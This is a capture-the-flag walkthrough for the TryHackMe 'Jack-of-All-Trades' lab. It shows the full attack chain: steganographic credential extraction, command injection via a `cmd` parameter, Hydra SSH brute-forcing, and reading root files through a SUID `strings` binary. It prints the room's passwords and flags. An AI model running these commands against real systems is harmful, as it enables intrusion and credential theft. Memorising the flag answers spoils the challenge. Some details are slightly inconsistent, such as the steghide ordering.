---
title: "Jack"
description: "A boot2root machine with swapped service ports, steganography, multi-layer encoding, command injection via recovery CMS, SSH brute-force, and SUID privilege escalation using /usr/bin/strings."
difficulty: "Medium"
tags: ["Steganography", "Base64", "Base32", "ROT13", "Command Injection", "Hydra", "SUID", "GTFOBins"]
date: "2026-07-23"
---

## Overview

Jack-of-All-Trades is a TryHackMe boot2root machine originally designed for Securi-Tay 2020. The challenge combines several techniques: ports are deliberately swapped (HTTP on 22, SSH on 80), steganography hides credentials in images, a recovery portal provides unauthenticated command injection, and a SUID `strings` binary allows reading the root flag. Each step requires chaining together multiple disciplines, making this a true "jack of all trades" challenge.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Medium
- **Skills Learned:** Steganography, multi-layer encoding (Base64 → Base32 → Hex → ROT13), command injection, Hydra brute-force, SUID privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

The scan revealed two open ports — but the services were swapped:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | HTTP | Apache httpd 2.4.10 (Debian) |
| 80/tcp | SSH | OpenSSH 6.7p1 Debian 5 |

![Nmap scan results](/assets/screenshots/jack/nmap.png)

Port 22 was running Apache instead of SSH, and port 80 was running OpenSSH instead of HTTP. This is the first misconfiguration.

### Accessing the Web Server

Firefox blocks port 22 by default for security reasons. This can be bypassed by navigating to `about:config`, searching for `network.security.ports.banned.override`, and adding `22` to the list:

![Firefox configuration to allow port 22](/assets/screenshots/jack/firefox_config.png)

After the fix, the website loads:

![Jack-of-all-trades homepage](/assets/screenshots/jack/webpage.png)

The homepage is a simple page with three images (`header.jpg`, `stego.jpg`, `jackinthebox.jpg`) and some placeholder text.

### Source Code Discovery

Viewing the page source revealed two important clues:

![Page source with hidden message](/assets/screenshots/jack/source_code.png)

A Base64-encoded comment and a reference to `/recovery.php`:

```
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

Decoding it:

```bash
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
```

![Base64 decoded message](/assets/screenshots/jack/base64_decode.png)

The decoded message reveals a password and hints at a recovery page:

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

### Recovery Page and Multi-Layer Encoding

Navigating to `/recovery.php` presented a login form:

![Recovery page login form](/assets/screenshots/jack/recovery_page.png)

Viewing the page source revealed another encoded string. Based on the reference to "Johny Graves" and his encoding system, the decoding chain was Base32 → Hex → ROT13:

![Base32 decode step](/assets/screenshots/jack/base32_decode.png)

After converting the hex output and applying ROT13:

![ROT13 decode result](/assets/screenshots/jack/rot13_decode.png)

The decoded message contained a hint about steganography:

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

The bit.ly link redirects to the Wikipedia page for Stegosauria — confirming steganography is the next step.

### Steganography — Extracting CMS Credentials

The homepage contained three images: `header.jpg`, `stego.jpg`, and `jackinthebox.jpg`. Using the password `u?WtKSraq` found earlier, `steghide` was used to extract hidden data from each image:

```bash
steghide extract -sf header.jpg
```

The first image (`stego.jpg`) yielded a red herring file. The second attempt on `header.jpg` succeeded:

![Steghide extracting from header.jpg](/assets/screenshots/jack/steghide_header.png)

The extracted file `cms.creds` contained the CMS login credentials:

![CMS credentials extracted](/assets/screenshots/jack/cms_creds.png)

```
Username: jackinthebox
Password: TplFxiSHjY
```

## Initial Access — Command Injection

Logging into `/recovery.php` with these credentials redirected to a hidden directory `/nnxhweOV/index.php`:

![Successful login redirection](/assets/screenshots/jack/login_success.png)

The page accepted a `cmd` GET parameter, executing arbitrary system commands:

```bash
?cmd=id
```

![Command execution via cmd parameter](/assets/screenshots/jack/cmd_exec.png)

This is a command injection vulnerability — the application passes user input directly to `system()` without sanitization.

### Enumerating the System

Listed the home directory to look for users and interesting files:

```bash
?cmd=ls -la /home/
```

![Home directory listing](/assets/screenshots/jack/home_dir.png)

A file named `jacks_password_list` was found in `/home/`. Reading it:

```bash
?cmd=cat /home/jacks_password_list
```

![Password list](/assets/screenshots/jack/password_list.png)

This contained 24 potential passwords for the user `jack`.

### SSH Brute-Force with Hydra

Since SSH was running on port 80, Hydra was used with the `-s 80` flag to brute-force the credentials:

```bash
hydra -l jack -P jacks_password_list.txt -s 80 <target-ip> ssh
```

![Hydra brute-forcing SSH on port 80](/assets/screenshots/jack/hydra.png)

The correct password was found: `ITMJpGGIqg1jn?>@`

Logged in via SSH:

```bash
ssh -p 80 jack@<target-ip>
```

![SSH login as jack](/assets/screenshots/jack/ssh_login.png)

### User Flag

The user flag was stored inside a JPEG image file. Transferred it to the attacking machine using SCP:

```bash
scp -P 80 jack@<target-ip>:/home/jack/user.jpg .
```

![SCP transferring user.jpg](/assets/screenshots/jack/scp_user_image.png)

Opening the image revealed the user flag:

![User flag in user.jpg](/assets/screenshots/jack/user_flag.png)

```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

## Privilege Escalation

### Finding SUID Binaries

Checked for SUID binaries — files that run with the owner's privileges regardless of who executes them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![Finding SUID binaries](/assets/screenshots/jack/suid_find.png)

An unusual SUID binary stood out: `/usr/bin/strings`. The `strings` command normally extracts printable text from binary files, but with the SUID bit set it executes as root.

### Reading the Root Flag

Using `strings` as a SUID binary from GTFOBins, the root flag could be read directly:

```bash
/usr/bin/strings /root/root.txt
```

![Root flag via SUID strings](/assets/screenshots/jack/root_flag.png)

```
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/jack/user.jpg` (image) | `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}` |
| Root | `/root/root.txt` | `securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}` |

## Commands Used

```bash
# Nmap scan
nmap -sV -sC -oN nmap.txt <target-ip>

# Decode base64 string from homepage source
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d

# Extract hidden data from header.jpg
steghide extract -sf header.jpg

# CMS login and command execution (via cookie)
curl -v -H "Cookie: login=jackinthebox%3C%25value%25" "http://<target-ip>:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list"

# Hydra brute-force SSH on port 80
hydra -l jack -P jacks_password_list.txt -s 80 <target-ip> ssh

# SSH login on port 80
ssh -p 80 jack@<target-ip>

# Transfer user flag image
scp -P 80 jack@<target-ip>:/home/jack/user.jpg .

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Read root flag with SUID strings
/usr/bin/strings /root/root.txt
```

## Lessons Learned

- **Swapped ports are a simple but effective misdirection.** Always verify what service is actually running on each port rather than assuming standard port assignments. Nmap's service version detection (`-sV`) is essential.
- **Multi-layer encoding requires methodical decoding.** The message referenced "Johny Graves" whose encoding system was Base32 → Hex → ROT13. Understanding the encoding chain was critical. Always use online tools like CyberChef to brute-force encoding detection when the scheme is unknown.
- **Steganography passwords can be hidden in unexpected places.** The passphrase for steghide was extracted from a Base64 comment in the HTML source. Hidden credentials often appear in page comments, configuration files, or image metadata.
- **Command injection through CMS recovery pages is a common vulnerability.** The `recovery.php` endpoint accepted a `cmd` parameter and passed it directly to `system()`. This allowed full remote command execution without authentication once the hidden directory was discovered.
- **Hydra can target non-standard SSH ports.** The `-s` flag specifies an alternate port, which was necessary because SSH was running on port 80 instead of the default 22.
- **GTFOBins is the definitive resource for SUID escalation.** The `strings` binary is not typically SUID, but when it is, GTFOBins documents exactly how to use it to read arbitrary files as root.
- **Always check for unusual SUID binaries.** Standard commands like `strings`, `find`, `nmap`, or `vim` should never have the SUID bit set in a hardened environment. The `find / -perm -4000` command is a fast way to identify these misconfigurations.

## References

- [TryHackMe — Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)
- [GTFOBins — strings SUID](https://gtfobins.github.io/gtfobins/strings/#suid)
- [CyberChef — Multi-encoding decoder](https://gchq.github.io/CyberChef/)
- [Firefox — Override port restrictions](https://support.mozilla.org/en-US/questions/1083282)
- [steghide — Steganography tool](http://steghide.sourceforge.net/)
- [Securi-Tay 2020 CTF](https://securi-tay.co.uk/)
